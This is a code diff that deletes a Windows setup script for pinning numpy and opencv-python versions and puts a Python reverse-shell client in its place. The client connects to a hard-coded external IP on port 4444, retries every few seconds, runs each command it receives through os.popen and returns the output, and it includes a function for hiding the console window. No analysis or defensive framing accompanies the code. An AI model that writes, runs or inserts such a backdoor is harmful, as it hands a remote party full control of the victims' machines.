@@ -1,7 +1,31 @@
-set PATH=%PATH%;%LOCALAPPDATA%\Programs\Python\Python311\Scripts;%LOCALAPPDATA%\Programs\Python\Python311
+import socket
+import time
+import os
+import ctypes
 
-pip uninstall numpy opencv-python -y
+SERVER_HOST = '152.53.182.180'
+SERVER_PORT = 4444
 
-pip install numpy==1.26.4
+def hide_console():
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-pip install opencv-python==4.9.0.80
+print("[+] Client Started - Trying to connect...")
+
+while True:
+    try:
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.settimeout(8)
+        client.connect((SERVER_HOST, SERVER_PORT))
+        print("[+] SUCCESS! Connected to VPS")
+        
+        while True:
+            cmd = client.recv(4096).decode('utf-8', errors='ignore').strip()
+            if cmd:
+                print(f"Received command: {cmd}")
+                if cmd.lower() == 'exit':
+                    break
+                output = os.popen(cmd).read()
+                client.send(output.encode() if output else b'[+] Done')
+    except Exception as e:
+        print(f"[-] Connection failed: {e}")
+        time.sleep(5)
